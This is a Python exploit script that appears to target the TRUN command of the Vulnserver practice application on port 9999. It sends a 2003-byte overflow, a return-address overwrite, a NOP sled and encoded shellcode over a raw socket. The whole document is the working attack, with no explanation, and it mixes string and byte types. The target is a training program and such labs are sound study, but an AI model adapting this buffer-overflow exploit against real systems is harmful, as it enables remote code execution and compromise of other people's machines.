import time,sys
import socket

ser = "192.168.225.105"
port = 9999

OFFSET = "A" * 2003
EIP = "\xaf\x11\x50\x62"

shellcode =  b""
shellcode += b"\xbe\xa3\xc5\xa5\xe8\xdb\xcb\xd9\x74\x24\xf4"
shellcode += b"\x5f\x29\xc9\xb1\x52\x83\xc7\x04\x31\x77\x0e"
shellcode += b"\x03\xd4\xcb\x47\x1d\xe6\x3c\x05\xde\x16\xbd"
shellcode += b"\x6a\x56\xf3\x8c\xaa\x0c\x70\xbe\x1a\x46\xd4"
shellcode += b"\x33\xd0\x0a\xcc\xc0\x94\x82\xe3\x61\x12\xf5"
shellcode += b"\xca\x72\x0f\xc5\x4d\xf1\x52\x1a\xad\xc8\x9c"
shellcode += b"\x6f\xac\x0d\xc0\x82\xfc\xc6\x8e\x31\x10\x62"
shellcode += b"\xda\x89\x9b\x38\xca\x89\x78\x88\xed\xb8\x2f"
shellcode += b"\x82\xb7\x1a\xce\x47\xcc\x12\xc8\x84\xe9\xed"
shellcode += b"\x63\x7e\x85\xef\xa5\x4e\x66\x43\x88\x7e\x95"
shellcode += b"\x9d\xcd\xb9\x46\xe8\x27\xba\xfb\xeb\xfc\xc0"
shellcode += b"\x27\x79\xe6\x63\xa3\xd9\xc2\x92\x60\xbf\x81"
shellcode += b"\x99\xcd\xcb\xcd\xbd\xd0\x18\x66\xb9\x59\x9f"
shellcode += b"\xa8\x4b\x19\x84\x6c\x17\xf9\xa5\x35\xfd\xac"
shellcode += b"\xda\x25\x5e\x10\x7f\x2e\x73\x45\xf2\x6d\x1c"
shellcode += b"\xaa\x3f\x8d\xdc\xa4\x48\xfe\xee\x6b\xe3\x68"
shellcode += b"\x43\xe3\x2d\x6f\xa4\xde\x8a\xff\x5b\xe1\xea"
shellcode += b"\xd6\x9f\xb5\xba\x40\x09\xb6\x50\x90\xb6\x63"
shellcode += b"\xf6\xc0\x18\xdc\xb7\xb0\xd8\x8c\x5f\xda\xd6"
shellcode += b"\xf3\x40\xe5\x3c\x9c\xeb\x1c\xd7\x63\x43\xff"
shellcode += b"\xf9\x0c\x96\xff\xab\x06\x1f\x19\xd9\x88\x76"
shellcode += b"\xb2\x76\x30\xd3\x48\xe6\xbd\xc9\x35\x28\x35"
shellcode += b"\xfe\xca\xe7\xbe\x8b\xd8\x90\x4e\xc6\x82\x37"
shellcode += b"\x50\xfc\xaa\xd4\xc3\x9b\x2a\x92\xff\x33\x7d"
shellcode += b"\xf3\xce\x4d\xeb\xe9\x69\xe4\x09\xf0\xec\xcf"
shellcode += b"\x89\x2f\xcd\xce\x10\xbd\x69\xf5\x02\x7b\x71"
shellcode += b"\xb1\x76\xd3\x24\x6f\x20\x95\x9e\xc1\x9a\x4f"
shellcode += b"\x4c\x88\x4a\x09\xbe\x0b\x0c\x16\xeb\xfd\xf0"
shellcode += b"\xa7\x42\xb8\x0f\x07\x03\x4c\x68\x75\xb3\xb3"
shellcode += b"\xa3\x3d\xc3\xf9\xe9\x14\x4c\xa4\x78\x25\x11"
shellcode += b"\x57\x57\x6a\x2c\xd4\x5d\x13\xcb\xc4\x14\x16"
shellcode += b"\x97\x42\xc5\x6a\x88\x26\xe9\xd9\xa9\x62"



req = "TRUN /.:/" + OFFSET + EIP + "\x90"*10 + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ser, port))
print(s.recv(1024))
s.send(req + EIP + OFFSET)
